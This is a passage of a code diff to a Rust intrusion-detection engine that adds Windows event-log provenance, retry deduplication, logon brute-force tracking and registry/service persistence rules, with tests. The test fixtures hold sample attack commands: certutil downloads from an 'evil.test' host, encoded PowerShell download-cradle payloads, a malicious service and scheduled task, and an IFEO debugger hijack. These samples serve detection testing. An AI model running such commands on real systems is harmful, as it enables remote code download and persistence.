@@ -21,6 +21,7 @@
 //! It never blocks the consumer: inspection is synchronous, allocation-light
 //! and lock-scoped to the beacon tracker only.
 
+pub mod accessor_correlation;
 mod baseline;
 pub mod fs_heuristics;
 pub mod runtime;
@@ -43,12 +44,16 @@ pub mod honeytoken_policy;
 mod ioa;
 mod ioc;
 mod netscan;
+pub mod registry_rules;
 pub mod replay;
 pub mod severity;
 pub mod sigma;
 mod stateful;
 #[cfg(any(windows, test))]
 pub mod windows_decoy;
+pub mod windows_evasion_rules;
+pub mod windows_logon;
+pub mod windows_roots;
 pub mod windows_rules;
 
 #[cfg(feature = "yara")]
@@ -69,6 +74,65 @@ use ioa::ProcContext;
 
 pub use ioc::IocSet;
 
+/// Native Windows process audit records have no verified live generation.
+/// Findings keep this source marker so admission and response stay fail-closed.
+pub fn is_historical_windows_process_event(event: &AgentEvent) -> bool {
+    matches!(
+        event.origin.as_ref().and_then(|o| o.source.as_deref()),
+        Some("windows_eventlog:Security:4688")
+            | Some("windows_eventlog:Microsoft-Windows-Sysmon/Operational:1")
+    )
+}
+
+/// Windows Event Log records are persisted audit evidence, including their
+/// derived findings; their PIDs are not verified live process identities.
+pub fn is_historical_windows_record(event: &AgentEvent) -> bool {
+    event
+        .origin
+        .as_ref()
+        .and_then(|o| o.source.as_deref())
+        .is_some_and(|source| source.starts_with("windows_eventlog:"))
+        || matches!(&event.data, EventData::Log(log) if windows_rules::eventlog_source(log).is_some())
+}
+
+/// Serial native pollers retry their last record when a durable checkpoint
+/// fails. Keep exactly one UUID per raw source, without suppressing the
+/// normalized events paired with it or unrelated telemetry.
+#[derive(Default)]
+pub struct CheckpointTracker {
+    last: [Option<uuid::Uuid>; 5],
+}
+
+impl CheckpointTracker {
+    pub fn is_retry(&mut self, event: &AgentEvent) -> bool {
+        let source = event
+            .origin
+            .as_ref()
+            .and_then(|origin| origin.source.as_deref());
+        let slot = match (&event.data, source) {
+            (EventData::Log(log), Some(source)) if log.source_type == "windows_eventlog" => {
+                match (source, log.source_path.as_str()) {
+                    ("windows_eventlog:Security", "Security") => 0,
+                    ("windows_eventlog:System", "System") => 1,
+                    ("windows_eventlog:Application", "Application") => 2,
+                    (
+                        "windows_eventlog:Microsoft-Windows-Sysmon/Operational",
+                        "Microsoft-Windows-Sysmon/Operational",
+                    ) => 3,
+                    _ => return false,
+                }
+            }
+            (EventData::Registry(_), Some("windows_registry_snapshot")) => 4,
+            _ => return false,
+        };
+        if self.last[slot] == Some(event.event_id) {
+            return true;
+        }
+        self.last[slot] = Some(event.event_id);
+        false
+    }
+}
+
 /// A mass write alone is a build, a `git checkout` or a sync client; it is
 /// ransomware-like only together with encrypted-looking content, a ransom
 /// extension or tampered backups seen this close in time (either order).
@@ -83,6 +147,30 @@ struct RansomContext {
 impl RansomContext {
     fn within(then: Option<f64>, now: f64) -> bool {
         then.is_some_and(|t| now >= t && now - t <= RANSOM_CORROBORATION_SECS)
+    }
+}
+
+/// Native audit records use recorded UTC, independently of live elapsed time.
+/// The Security cursor is ordered; late timestamps (including clock rollback)
+/// remain telemetry but cannot change correlation history or complete a burst.
+#[derive(Default)]
+struct RecordedWindowsLogons {
+    tracker: windows_logon::WindowsLogonTracker,
+    last_timestamp: Option<chrono::DateTime<chrono::Utc>>,
+}
+
+impl RecordedWindowsLogons {
+    fn observe(
+        &mut self,
+        logon: &trapd_schema::UserLogonData,
+        timestamp: chrono::DateTime<chrono::Utc>,
+    ) -> Vec<DetectionData> {
+        if self.last_timestamp.is_some_and(|last| timestamp < last) {
+            return Vec::new();
+        }
+        self.last_timestamp = Some(timestamp);
+        self.tracker
+            .observe(logon, timestamp.timestamp_millis() as f64 / 1000.0)
     }
 }
 
@@ -108,6 +196,8 @@ pub struct DetectionEngine {
     anomaly_enabled: std::sync::atomic::AtomicBool,
     /// Multi-event single-host rules (recon bursts, brute force, chmod+exec).
     stateful: Mutex<stateful::StatefulRules>,
+    recorded_windows_logons: Mutex<RecordedWindowsLogons>,
+    analysis_checkpoints: Mutex<CheckpointTracker>,
     /// When filesystem ransomware indicators last fired, so a write burst is
     /// only an alert when something else corroborates it.
     ransom: Mutex<RansomContext>,
@@ -179,6 +269,8 @@ impl DetectionEngine {
             ),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             stateful: Mutex::new(stateful::StatefulRules::new()),
+            recorded_windows_logons: Mutex::new(RecordedWindowsLogons::default()),
+            analysis_checkpoints: Mutex::new(CheckpointTracker::default()),
             ransom: Mutex::new(RansomContext::default()),
             gate: Mutex::new(gate::FindingGate::with_runtime(runtime.clone())),
             self_pid: std::process::id() as i32,
@@ -333,21 +425,37 @@ impl DetectionEngine {
         if matches!(event.class, EventClass::Detection) {
             return Vec::new();
         }
+        if self
+            .analysis_checkpoints
+            .lock()
+            .map(|mut checkpoints| checkpoints.is_retry(event))
+            .unwrap_or(false)
+        {
+            return Vec::new();
+        }
         self.clock_bits.store(elapsed_secs.to_bits(), Relaxed);
 
         // Stateful IOA correlation runs first: it keeps the process tree
         // current (so this event's own process resolves), yields the acting
         // process's context, and emits any attack chains that just completed.
-        let (ioa, ctx, own) = match self.ioa.lock() {
-            Ok(mut e) => {
-                let res = e.observe(event, now);
-                let own = res
-                    .pid
-                    .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
-                let ctx = res.pid.and_then(|p| e.context(p));
-                (res, ctx, own)
+        let historical_process = is_historical_windows_process_event(event)
+            && matches!(event.data, EventData::ProcessCreate(_));
+        let (ioa, ctx, own) = if historical_process {
+            // Audit timestamps and PIDs describe an earlier process, not the
+            // currently running generation. Never update or query live IOA.
+            (ioa::IoaResult::default(), None, false)
+        } else {
+            match self.ioa.lock() {
+                Ok(mut e) => {
+                    let res = e.observe(event, now);
+                    let own = res
+                        .pid
+                        .is_some_and(|p| p == self.self_pid || e.descends_from(self.self_pid, p));
+                    let ctx = res.pid.and_then(|p| e.context(p));
+                    (res, ctx, own)
+                }
+                Err(_) => (ioa::IoaResult::default(), None, false),
             }
-            Err(_) => (ioa::IoaResult::default(), None, false),
         };
         if own {
             return Vec::new();
@@ -360,7 +468,16 @@ impl DetectionEngine {
                 // With eBPF exec telemetry every process also arrives as a
                 // ProcessExec; inspecting the /proc-polled copy too would
                 // duplicate every process finding.
-                if !self.ebpf_exec_seen.load(Relaxed) {
+                if historical_process {
+                    self.inspect_process_rules(
+                        &p.name,
+                        &p.exe,
+                        &p.cmdline,
+                        p.exe_sha256.as_deref(),
+                        None,
+                        &mut out,
+                    );
+                } else if !self.ebpf_exec_seen.load(Relaxed) {
                     self.inspect_process(
                         &p.name,
                         &p.exe,
@@ -437,6 +554,28 @@ impl DetectionEngine {
             EventData::RansomwareIndicator(r) => {
                 self.inspect_ransomware(r, &mut out);
             }
+            // Windows logons (normalised, carry a logon type) have their own
+            // account- and source-keyed tracker; the SSH one is source-only.
+            EventData::UserLogon(l) if is_historical_windows_record(event) => {
+                let hits = self
+                    .recorded_windows_logons
+                    .lock()
+                    .map(|mut tracker| tracker.observe(l, event.timestamp))
+                    .unwrap_or_default();
+                for d in hits {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
+            EventData::UserLogon(l) if l.logon_type.is_some() => {
+                let hits = self
+                    .stateful
+                    .lock()
+                    .map(|mut st| st.observe_windows_logon(l, elapsed_secs))
+                    .unwrap_or_default();
+                for d in hits {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
             EventData::UserLogon(l) => {
                 let src = l.src_addr.as_deref().unwrap_or("");
                 let hit =
@@ -447,7 +586,16 @@ impl DetectionEngine {
                     out.push(self.detection(Severity::Info, d));
                 }
             }
+            EventData::Registry(r) => {
+                for d in registry_rules::inspect_registry(r) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
             EventData::Log(l) => {
+                // Service / scheduled-task creation (7045, 4697, 4698).
+                for d in registry_rules::inspect_eventlog(l) {
+                    out.push(self.detection(Severity::Info, d));
+                }
                 // Log records feed the same engine: a sudo COMMAND is an
                 // exec-equivalent, a remote_addr/src_addr is a network IOC.
                 if let Some(cmd) = l.fields.get("command").and_then(|v| v.as_str()) {
@@ -463,12 +611,14 @@ impl DetectionEngine {
                 // Windows 4688 (process creation): the command line the ETW
                 // sensor could not read before a short-lived process exited.
                 // Repeats of a command ETW did capture fold in the gate.
-                if l.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4688) {
+                if l.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4688)
+                    && windows_rules::eventlog_source(l).is_some()
+                {
                     let text = |k: &str| l.fields.get(k).and_then(|v| v.as_str()).unwrap_or("");
                     let (exe, cmd) = (text("NewProcessName"), text("CommandLine"));
                     if !cmd.is_empty() {
                         let name = exe.rsplit(['\\', '/']).next().unwrap_or(exe);
-                        self.inspect_process(name, exe, cmd, None, None, &mut out);
+                        self.inspect_process_rules(name, exe, cmd, None, None, &mut out);
                     }
                 }
                 let ip = l
@@ -508,7 +658,11 @@ impl DetectionEngine {
 
         // Enrich the per-event findings with the actor's process lineage, then
         // add the attack chains that just completed.
-        if let Some(lineage) = &ioa.lineage {
+        if let Some(lineage) = ioa
+            .lineage
+            .as_ref()
+            .filter(|_| !is_historical_windows_record(event))
+        {
             for ev in out.iter_mut() {
                 if let EventData::Detection(d) = &mut ev.data {
                     inject_lineage(&mut d.evidence, lineage);
@@ -520,11 +674,31 @@ impl DetectionEngine {
         }
 
         for ev in out.iter_mut() {
+            if is_historical_windows_record(event) {
+                // Preserve the audit provenance on findings: external
+                // admission and response must not rebind an archived PID.
+                ev.timestamp = match &event.data {
+                    EventData::Log(log) => log.log_timestamp.unwrap_or(event.timestamp),
+                    _ => event.timestamp,
+                };
+                if let Some(finding_origin) = &mut ev.origin {
+                    finding_origin.source = event
+                        .origin
+                        .as_ref()
+                        .and_then(|origin| origin.source.as_ref())
+                        .filter(|source| source.starts_with("windows_eventlog:"))
+                        .cloned()
+                        .or_else(|| match &event.data {
+                            EventData::Log(log) => windows_rules::eventlog_source(log),
+                            _ => None,
+                        });
+                }
+            }
             self.finalize(ev, Some(event), ctx);
         }
         // Inspect deterministic evidence first. A suspicious execution cannot
         // authorize its own admission to the learned normal baseline.
-        if self.anomaly_enabled.load(Relaxed) {
+        if !historical_process && self.anomaly_enabled.load(Relaxed) {
             let actor = match &event.data {
                 EventData::ProcessExec(p) => Some((&p.username, &p.exe)),
                 EventData::ProcessCreate(p) if !self.ebpf_exec_seen.load(Relaxed) => {
@@ -610,13 +784,17 @@ impl DetectionEngine {
                 .and_then(|v| v.as_i64())
                 .map(|p| p as i32)
                 .or_else(|| d.correlation.as_ref().and_then(|c| c.pid));
-            let (ctx, own, lineage) = match (pid, self.ioa.lock()) {
-                (Some(pid), Ok(e)) => (
-                    e.context(pid),
-                    pid == self.self_pid || e.descends_from(self.self_pid, pid),
-                    e.lineage(pid),
-                ),
-                _ => (None, false, None),
+            let (ctx, own, lineage) = if is_historical_windows_record(&event) {
+                (None, false, None)
+            } else {
+                match (pid, self.ioa.lock()) {
+                    (Some(pid), Ok(e)) => (
+                        e.context(pid),
+                        pid == self.self_pid || e.descends_from(self.self_pid, pid),
+                        e.lineage(pid),
+                    ),
+                    _ => (None, false, None),
+                }
             };
             if own {
                 return Vec::new();
@@ -652,6 +830,13 @@ impl DetectionEngine {
         trigger: Option<&AgentEvent>,
         ctx: Option<&ProcContext>,
     ) {
+        let ctx = if is_historical_windows_record(ev)
+            || trigger.is_some_and(is_historical_windows_record)
+        {
+            None
+        } else {
+            ctx
+        };
         let emitted_severity = ev.severity;
         let EventData::Detection(d) = &mut ev.data else {
             return;
@@ -747,6 +932,40 @@ impl DetectionEngine {
         ctx: Option<&ProcContext>,
         out: &mut Vec<AgentEvent>,
     ) {
+        self.inspect_process_rules(comm, exe, cmdline, exe_hash, ctx, out);
+
+        // Session-level stateful rules.
+        let base = comm.rsplit('/').next().unwrap_or(comm);
+        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
+        let now = self.clock();
+        if let Ok(mut st) = self.stateful.lock() {
+            if let Some(session) = &session {
+                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+                if base == "systemctl" {
+                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
+                        out.push(self.detection(Severity::Info, d));
+                    }
+                }
+            }
+            if is_temp_path(exe) {
+                if let Some(d) = st.observe_temp_exec(exe, now) {
+                    out.push(self.detection(Severity::Info, d));
+                }
+            }
+        }
+    }
+
+    fn inspect_process_rules(
+        &self,
+        comm: &str,
+        exe: &str,
+        cmdline: &str,
+        exe_hash: Option<&str>,
+        ctx: Option<&ProcContext>,
+        out: &mut Vec<AgentEvent>,
+    ) {
         // IOC: known-bad executable hash.
         if let Some(h) = exe_hash {
             let hit = self.iocs.read().map(|i| i.match_hash(h)).unwrap_or(false);
@@ -787,30 +1006,11 @@ impl DetectionEngine {
             out.push(self.detection(Severity::Info, d));
         }
         // Windows LOLBin / persistence / evasion rules (match `*.exe` only).
-        for d in windows_rules::inspect_process(comm, exe, cmdline, ctx) {
+        let windows_found = windows_rules::inspect_process(comm, exe, cmdline, ctx);
+        let windows_extra =
+            windows_evasion_rules::inspect_additional(comm, exe, cmdline, ctx, &windows_found);
+        for d in windows_found.into_iter().chain(windows_extra) {
             out.push(self.detection(Severity::Info, d));
-        }
-
-        // Session-level stateful rules.
-        let base = comm.rsplit('/').next().unwrap_or(comm);
-        let session = ctx.and_then(|c| c.root_key.clone().or_else(|| c.parent_key.clone()));
-        let now = self.clock();
-        if let Ok(mut st) = self.stateful.lock() {
-            if let Some(session) = &session {
-                if let Some(d) = st.observe_exec_recon(session, base, cmdline, now) {
-                    out.push(self.detection(Severity::Info, d));
-                }
-                if base == "systemctl" {
-                    if let Some(d) = st.observe_systemctl(session, cmdline, now) {
-                        out.push(self.detection(Severity::Info, d));
-                    }
-                }
-            }
-            if is_temp_path(exe) {
-                if let Some(d) = st.observe_temp_exec(exe, now) {
-                    out.push(self.detection(Severity::Info, d));
-                }
-            }
         }
     }
 
@@ -1696,6 +1896,8 @@ mod tests {
             baseline: Mutex::new(baseline::BaselineEngine::new()),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             stateful: Mutex::new(stateful::StatefulRules::new()),
+            recorded_windows_logons: Mutex::new(RecordedWindowsLogons::default()),
+            analysis_checkpoints: Mutex::new(CheckpointTracker::default()),
             ransom: Mutex::new(RansomContext::default()),
             gate: Mutex::new(gate::FindingGate::new()),
             // Not this test process: tests feed synthetic pids.
@@ -2200,10 +2402,10 @@ mod tests {
                 parser: "windows_eventlog".into(),
                 message: String::new(),
                 category: "authentication".into(),
-                log_timestamp: None,
+                log_timestamp: chrono::DateTime::from_timestamp(1_600_000_000, 0),
                 facility: None,
                 log_severity: None,
-                proc: None,
+                proc: Some("Microsoft-Windows-Security-Auditing".into()),
                 pid: None,
                 uid: None,
                 username: None,
@@ -2216,6 +2418,263 @@ mod tests {
                 truncated_fields: None,
             })),
         )
+    }
+
+    fn persistence_audit_event(id: u64) -> AgentEvent {
+        let mut event =
+            process_audit_event("certutil -urlcache -f http://example.test/a C:\\Temp\\a");
+        let EventData::Log(log) = &mut event.data else {
+            unreachable!()
+        };
+        log.source_path = if id == 7045 { "System" } else { "Security" }.into();
+        log.proc = Some(
+            if id == 7045 {
+                "Service Control Manager"
+            } else {
+                "Microsoft-Windows-Security-Auditing"
+            }
+            .into(),
+        );
+        log.log_timestamp = chrono::DateTime::from_timestamp(1_600_000_000, 0);
+        if id != 4688 {
+            log.fields = serde_json::json!({
+                "EventID": id, "ServiceName": "evil",
+                "ImagePath": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+                "ServiceFileName": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+                "TaskName": "evil", "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=</Arguments></Exec></Actions></Task>"
+            }).as_object().unwrap().clone();
+        }
+        event
+    }
+
+    #[test]
+    fn native_windows_rules_require_the_event_channel_and_provider() {
+        for id in [4688, 7045, 4697, 4698] {
+            for mismatch in [
+                "channel",
+                "provider",
+                "missing_provider",
+                "missing_time",
+                "spoofed_field_provider",
+                "generic_file",
+            ] {
+                let mut event = persistence_audit_event(id);
+                let EventData::Log(log) = &mut event.data else {
+                    unreachable!()
+                };
+                match mismatch {
+                    "channel" => log.source_path = "Application".into(),
+                    "provider" => log.proc = Some("Custom Application".into()),
+                    "missing_provider" => log.proc = None,
+                    "missing_time" => log.log_timestamp = None,
+                    "spoofed_field_provider" => {
+                        log.proc = Some("Custom Application".into());
+                        log.fields.insert(
+                            "Provider".into(),
+                            serde_json::json!("Microsoft-Windows-Security-Auditing"),
+                        );
+                    }
+                    "generic_file" => log.source_type = "file".into(),
+                    _ => unreachable!(),
+                }
+                assert!(
+                    engine().inspect(&event).is_empty(),
+                    "event {id}, wrong {mismatch}"
+                );
+            }
+        }
+    }
+
+    fn raw_checkpoint_event(channel: &str) -> AgentEvent {
+        let mut event =
+            persistence_audit_event(4688).with_source(&format!("windows_eventlog:{channel}"));
+        let EventData::Log(log) = &mut event.data else {
+            unreachable!()
+        };
+        log.source_path = channel.into();
+        log.fields.clear();
+        log.fields
+            .insert("src_addr".into(), serde_json::json!("203.0.113.5"));
+        event
+    }
+
+    #[test]
+    fn native_raw_retries_do_not_inflate_finding_gate_counts() {
+        let e = engine();
+        let now = Instant::now();
+        let event = raw_checkpoint_event("Security");
+        let first = e.admit_at(e.inspect_at(&event, now, 0.0), now);
+        assert_eq!(first.len(), 1);
+        assert_eq!(det_of(&first[0].event).occurrence_count, Some(1));
+        let retry = e.inspect_at(&event, now, 1.0);
+        assert!(
+            retry.is_empty(),
+            "same native raw UUID must not be analyzed twice"
+        );
+        assert!(e.admit_at(retry, now).is_empty());
+        let mut next = event.clone();
+        next.event_id = uuid::Uuid::new_v4();
+        assert_eq!(next.timestamp, event.timestamp);
+        let findings = e.inspect_at(&next, now, 2.0);
+        assert_eq!(
+            findings.len(),
+            1,
+            "new record at equal UTC must be analyzed"
+        );
+        e.admit_at(findings, now);
+        let updates = e.flush_findings_at(now, true);
+        assert_eq!(updates.len(), 1);
+        assert_eq!(det_of(&updates[0].event).occurrence_count, Some(2));
+    }
+
+    #[test]
+    fn native_raw_channel_checkpoints_are_independent_and_remember_only_the_last_uuid() {
+        let e = engine();
+        let mut event = raw_checkpoint_event("Security");
+        for channel in [
+            "Security",
+            "System",
+            "Application",
+            "Microsoft-Windows-Sysmon/Operational",
+        ] {
+            event.origin.as_mut().unwrap().source = Some(format!("windows_eventlog:{channel}"));
+            let EventData::Log(log) = &mut event.data else {
+                unreachable!()
+            };
+            log.source_path = channel.into();
+            assert_eq!(e.inspect(&event).len(), 1, "independent channel {channel}");
+            assert!(e.inspect(&event).is_empty(), "retry in channel {channel}");
+        }
+        let original = event.clone();
+        event.event_id = uuid::Uuid::new_v4();
+        assert_eq!(e.inspect(&event).len(), 1);
+        assert_eq!(
+            e.inspect(&original).len(),
+            1,
+            "only the last source UUID is remembered"
+        );
+    }
+
+    #[test]
+    fn registry_snapshot_retries_are_skipped_but_other_registry_sources_are_not() {
+        let e = engine();
+        let mut event = AgentEvent::new("a".into(), "h".into(), EventClass::Registry,
+            EventAction::Modify, Severity::Info,
+            EventData::Registry(trapd_schema::RegistryEventData {
+                key_path: r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\app.exe".into(),
+                value_name: "Debugger".into(), category: "ifeo".into(), user_sid: None,
+                old_value: None, new_value: Some("cmd.exe".into()), rename_from: None, suppressed: None,
+            })).with_source("windows_registry_snapshot");
+        assert!(!e.inspect(&event).is_empty());
+        assert!(
+            e.inspect(&event).is_empty(),
+            "checkpoint retry must not repeat registry rules"
+        );
+        event.event_id = uuid::Uuid::new_v4();
+        assert!(
+            !e.inspect(&event).is_empty(),
+            "new registry record at equal UTC is distinct"
+        );
+        event.origin.as_mut().unwrap().source = Some("windows_eventlog:Security:4657".into());
+        assert!(!e.inspect(&event).is_empty());
+        assert!(
+            !e.inspect(&event).is_empty(),
+            "normalized registry events are not raw checkpoints"
+        );
+    }
+
+    #[test]
+    fn raw_checkpoint_filter_does_not_suppress_generic_logs_or_normalized_events() {
+        let e = engine();
+        let mut generic = raw_checkpoint_event("Security");
+        let EventData::Log(log) = &mut generic.data else {
+            unreachable!()
+        };
+        log.source_type = "file".into();
+        assert_eq!(e.inspect(&generic).len(), 1);
+        assert_eq!(e.inspect(&generic).len(), 1);
+        let unknown = raw_checkpoint_event("CustomChannel");
+        assert_eq!(e.inspect(&unknown).len(), 1);
+        assert_eq!(e.inspect(&unknown).len(), 1);
+        let process = AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Process,
+            EventAction::Create,
+            Severity::Info,
+            EventData::ProcessCreate(ProcessCreateData {
+                pid: 777,
+                name: "certutil.exe".into(),
+                exe: r"C:\Windows\System32\certutil.exe".into(),
+                cmdline: "certutil -urlcache -f http://example.test/a C:\\Temp\\a".into(),
+                ..Default::default()
+            }),
+        )
+        .with_source("windows_eventlog:Security:4688");
+        assert!(!e.inspect(&process).is_empty());
+        assert!(!e.inspect(&process).is_empty());
+        let failure = audit_logon_at(false, 100);
+        for _ in 0..3 {
+            e.inspect(&failure);
+        }
+        assert!(
+            find(
+                &e.inspect(&audit_logon_at(true, 101)),
+                "auth.windows_bruteforce_success"
+            )
+            .is_some(),
+            "normalized auth outcomes must not use raw checkpoint slots"
+        );
+    }
+
+    #[test]
+    fn generic_log_network_ioc_rules_survive_windows_provider_gating() {
+        let mut event = persistence_audit_event(4688);
+        let EventData::Log(log) = &mut event.data else {
+            unreachable!()
+        };
+        log.source_type = "file".into();
+        log.fields
+            .insert("src_addr".into(), serde_json::json!("203.0.113.5"));
+        let findings = engine().inspect(&event);
+        assert_eq!(findings.len(), 1);
+        assert_eq!(det_of(&findings[0]).rule_id, "ioc.network_ip");
+        assert!(!is_historical_windows_record(&findings[0]));
+    }
+
+    #[test]
+    fn source_less_unknown_windows_records_do_not_infer_native_provenance() {
+        for id in [None, Some(9999)] {
+            let mut event = persistence_audit_event(4688);
+            let EventData::Log(log) = &mut event.data else {
+                unreachable!()
+            };
+            log.fields.clear();
+            if let Some(id) = id {
+                log.fields.insert("EventID".into(), serde_json::json!(id));
+            }
+            assert!(windows_rules::eventlog_source(log).is_none());
+            assert!(!is_historical_windows_record(&event));
+        }
+    }
+
+    #[test]
+    fn native_windows_log_findings_keep_recorded_source_without_envelope_marker() {
+        for id in [4688, 7045, 4697, 4698] {
+            let event = persistence_audit_event(id);
+            let EventData::Log(log) = &event.data else {
+                unreachable!()
+            };
+            let findings = engine().inspect(&event);
+            assert!(!findings.is_empty(), "valid native event {id}");
+            for finding in findings {
+                assert_eq!(finding.timestamp, log.log_timestamp.unwrap());
+                assert_eq!(
+                    finding.origin.unwrap().source,
+                    Some(format!("windows_eventlog:{}:{id}", log.source_path))
+                );
+            }
+        }
     }
 
     #[test]
@@ -2289,6 +2748,255 @@ mod tests {
             EventData::Detection(d) => d,
             _ => panic!("not a detection"),
         }
+    }
+
+    #[test]
+    fn historical_windows_process_never_borrows_reused_pid_context() {
+        for source in [
+            "windows_eventlog:Security:4688",
+            "windows_eventlog:Microsoft-Windows-Sysmon/Operational:1",
+        ] {
+            let e = engine();
+            let now = Instant::now();
+            {
+                let mut ioa = e.ioa.lock().unwrap();
+                ioa.observe(&exec(200, 1, 0, "sshd", "/usr/sbin/sshd", "sshd"), now);
+                ioa.observe(&exec(300, 200, 1000, "safe", "/usr/bin/safe", "safe"), now);
+            }
+            let before = e.ioa.lock().unwrap().context(300).unwrap();
+            let mut historical = AgentEvent::new(
+                "a".into(), "h".into(), EventClass::Process, EventAction::Create, Severity::Info,
+                EventData::ProcessCreate(ProcessCreateData {
+                    pid: 300, ppid: 777, name: "powershell.exe".into(),
+                    exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into(),
+                    cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA".into(),
+                    username: "DOMAIN\\former".into(), exe_sha256: Some("deadbeef".into()),
+                    ..Default::default()
+                }),
+            ).with_source(source);
+            historical.timestamp = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
+                .unwrap()
+                .with_timezone(&chrono::Utc);
+            let findings = e.inspect_at(&historical, now, 10.0);
+            let finding = find(&findings, "execution.powershell_encoded")
+                .expect("audit command line remains detectable");
+            assert_eq!(finding.timestamp, historical.timestamp);
+            let correlation = det_of(finding).correlation.as_ref().unwrap();
+            assert!(
+                correlation.process_key.is_none(),
+                "audit PID must not bind to live generation"
+            );
+            assert!(correlation.parent_key.is_none());
+            assert!(correlation.root_key.is_none());
+            assert!(correlation.lineage_keys.is_empty());
+            assert_eq!(correlation.pid, Some(300));
+            assert_eq!(correlation.user.as_deref(), Some("DOMAIN\\former"));
+            assert_eq!(
+                correlation.exe.as_deref(),
+                Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
+            );
+            assert!(det_of(finding).evidence.get("process_lineage").is_none());
+            assert_eq!(
+                finding.origin.as_ref().unwrap().source.as_deref(),
+                Some(source)
+            );
+            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
+            // Main-loop external admission must not reacquire the live PID.
+            let ioc = find(&findings, "ioc.process_hash").unwrap().clone();
+            let admitted = e.admit_external_at(ioc, now);
+            assert!(!admitted.is_empty());
+            for emitted in admitted {
+                let d = det_of(&emitted.event);
+                assert!(d.correlation.as_ref().unwrap().process_key.is_none());
+                assert!(d.correlation.as_ref().unwrap().lineage_keys.is_empty());
+                assert!(d.evidence.get("process_lineage").is_none());
+            }
+            e.ebpf_exec_seen.store(true, Relaxed);
+            assert!(
+                find(
+                    &e.inspect_at(&historical, now, 11.0),
+                    "execution.powershell_encoded"
+                )
+                .is_some(),
+                "live telemetry latch must not suppress historical audit detection"
+            );
+            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
+        }
+    }
+
+    #[test]
+    fn historical_windows_raw_log_findings_preserve_provenance_on_admission() {
+        let e = engine();
+        e.set_rule_modes(&[crate::RuleModeOverride {
+            rule: "lolbin.certutil_download".into(),
+            mode: DetectionMode::Alert,
+        }]);
+        let now = Instant::now();
+        e.ioa
+            .lock()
+            .unwrap()
+            .observe(&exec(300, 1, 1000, "safe", "/usr/bin/safe", "safe"), now);
+        let mut audit =
+            process_audit_event("certutil -urlcache -f http://evil.test/a.txt C:\\Temp\\a.txt")
+                .with_source("windows_eventlog:Security");
+        let observed = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
+            .unwrap()
+            .with_timezone(&chrono::Utc);
+        if let EventData::Log(log) = &mut audit.data {
+            log.pid = Some(300); // Provider process, not necessarily the actor.
+            log.log_timestamp = Some(observed);
+        }
+        let findings = e.inspect_at(&audit, now, 10.0);
+        let mut finding = find(&findings, "lolbin.certutil_download").unwrap().clone();
+        assert_eq!(
+            finding.origin.as_ref().unwrap().source.as_deref(),
+            Some("windows_eventlog:Security")
+        );
+        assert_eq!(finding.timestamp, observed);
+        // Even a forensic PID added by an external rule cannot bind live context.
+        if let EventData::Detection(d) = &mut finding.data {
+            d.evidence["pid"] = serde_json::json!(300);
+        }
+        let admitted = e.admit_external_at(finding, now);
+        assert!(!admitted.is_empty());
+        for finding in admitted {
+            let d = det_of(&finding.event);
+            assert!(d.correlation.as_ref().unwrap().process_key.is_none());
+            assert!(d.evidence.get("process_lineage").is_none());
+        }
+    }
+
+    fn audit_logon_at(success: bool, seconds: i64) -> AgentEvent {
+        let mut event = AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::User,
+            EventAction::Logon,
+            Severity::Info,
+            EventData::UserLogon(trapd_schema::UserLogonData {
+                username: "alice".into(),
+                domain: Some("CORP".into()),
+                src_addr: Some("203.0.113.5".into()),
+                success,
+                logon_type: Some(3),
+                ..Default::default()
+            }),
+        )
+        .with_source(if success {
+            "windows_eventlog:Security:4624"
+        } else {
+            "windows_eventlog:Security:4625"
+        });
+        event.timestamp = chrono::DateTime::from_timestamp(1_600_000_000 + seconds, 0).unwrap();
+        event
+    }
+
+    #[test]
+    fn recorded_windows_logons_do_not_compress_hours_into_collection_time() {
+        let e = engine();
+        let receipt = Instant::now();
+        for i in 0..5 {
+            assert!(
+                e.inspect_at(&audit_logon_at(false, i * 3600), receipt, 0.0)
+                    .is_empty(),
+                "hour-separated audit failures must not form a five-minute burst"
+            );
+        }
+        assert!(e
+            .inspect_at(&audit_logon_at(true, 5 * 3600), receipt, 0.0)
+            .is_empty());
+    }
+
+    #[test]
+    fn recorded_windows_logon_burst_preserves_evidence_source_and_timestamp() {
+        let e = engine();
+        let receipt = Instant::now();
+        for i in 0..5 {
+            e.inspect_at(&audit_logon_at(false, i * 30), receipt, 0.0);
+        }
+        let success = audit_logon_at(true, 150);
+        let findings = e.inspect_at(&success, receipt, 0.0);
+        let finding = find(&findings, "auth.windows_bruteforce_success")
+            .expect("genuine five-minute audit burst must remain detectable");
+        assert!(is_historical_windows_record(finding));
+        assert_eq!(finding.timestamp, success.timestamp);
+        assert_eq!(
+            finding.origin.as_ref().unwrap().source.as_deref(),
+            Some("windows_eventlog:Security:4624")
+        );
+        assert_eq!(
+            det_of(finding)
+                .correlation
+                .as_ref()
